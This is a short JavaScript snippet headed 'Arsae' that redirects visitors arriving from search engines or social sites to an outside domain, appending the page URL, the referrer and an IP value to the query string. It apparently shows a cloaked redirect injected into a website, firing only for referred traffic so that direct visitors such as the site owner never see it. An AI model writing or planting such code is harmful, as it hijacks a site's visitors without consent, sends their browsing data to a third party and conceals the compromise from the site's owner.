///// Arsae /////
var arsT1Bing = 'https://blog.unimal.edu.pl';

if(['google.', 'msn.', 'bing.', 'yandex.', 'facebook.', 'ecosia', 'qwant', 'pinterest.', 'duckduckgo.', '.yahoo.', 't.co'].some(s => document.referrer.toLowerCase().includes(s))){ 
	window.location.href = arsT1Bing + '/?arsae='+ encodeURIComponent(window.location.href) + '&arsae_ref='+ encodeURIComponent(document.referrer) + '&ip=' + window.ipAddressArsae
}
